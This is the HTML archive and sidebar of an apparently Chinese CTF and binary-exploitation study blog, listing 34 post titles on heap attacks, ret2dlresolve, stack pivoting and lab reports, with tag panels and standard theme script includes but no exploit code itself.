+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 34
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/03</span>
+            <a class="archive-post-title" href="/2022/07/03/0ctf_2018_babystack/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span>
+            <a class="archive-post-title" href="/2022/07/02/ret2dlresolve_x64/">ret2dlresolve_x64</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span>
+            <a class="archive-post-title" href="/2022/04/29/dl-runtime-resolve/">ret2dl-resolve</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span>
+            <a class="archive-post-title" href="/2022/04/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/">延迟绑定</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span>
+            <a class="archive-post-title" href="/2022/04/22/houseofAtum/">BCTF2018 House of Atum</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span>
+            <a class="archive-post-title" href="/2022/04/20/gundam/">HITBCTF2018 gundam</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span>
+            <a class="archive-post-title" href="/2022/04/19/IDA%20pro/">IDA pro创建结构体</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span>
+            <a class="archive-post-title" href="/2022/04/18/examination/">examination</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2022/04/17/LCTF2018%20PWN%20easy_heap/">LCTF2018 easy_heap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span>
+            <a class="archive-post-title" href="/2022/04/08/tcache/">tcache</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span>
+            <a class="archive-post-title" href="/2022/04/07/libc-2.26/">libc 2.26</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span>
+            <a class="archive-post-title" href="/2022/04/07/house-of-storm/">house of storm</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span>
+            <a class="archive-post-title" href="/2022/04/04/%E5%B3%BB%E6%9E%81pwn/">峻极pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span>
+            <a class="archive-post-title" href="/2022/03/19/stack%20pivoting/">stack pivoting</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2022/02/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span>
+            <a class="archive-post-title" href="/2022/01/16/large%20bin%20attack/">large bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/magicheap/">magicheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/unsorted%20bin%20attack/">unsorted bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span>
+            <a class="archive-post-title" href="/2022/01/13/pwn200/">pwn200</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span>
+            <a class="archive-post-title" href="/2022/01/12/write%20some%20paper/">write some paper</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span>
+            <a class="archive-post-title" href="/2022/01/09/fastbin_attack/">fastbin_attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/overlapping%20chunks/">overlapping chunks</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/">gdb的使用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/ciscn_2019/">ciscn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/csaw/">csaw部分题解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/secretHolder_hitcon_2016/">secretHolder_hitcon_2016</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/unsafe_unlink/">unsafe_unlink</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/kernel_pwn%E7%8E%AF%E5%A2%83/">kernel pwn环境搭建</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/pwnable%E5%88%B7%E9%A2%98/">pwnable刷题</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2022/04/25/srop/">srop</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2022/05/07/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">非栈上的格式化字符串漏洞</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="tcache">
+                <span class="iconfont-archer">&#xe606;</span>
+                tcache
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="os">
+                <span class="iconfont-archer">&#xe606;</span>
+                os
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="unsorted bin attack">
+                <span class="iconfont-archer">&#xe606;</span>
+                unsorted bin attack
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="house of spirit">
+                <span class="iconfont-archer">&#xe606;</span>
+                house of spirit
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="fastbin doule free">
+                <span class="iconfont-archer">&#xe606;</span>
+                fastbin doule free
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Diary">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Diary
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20210823"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20210823"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
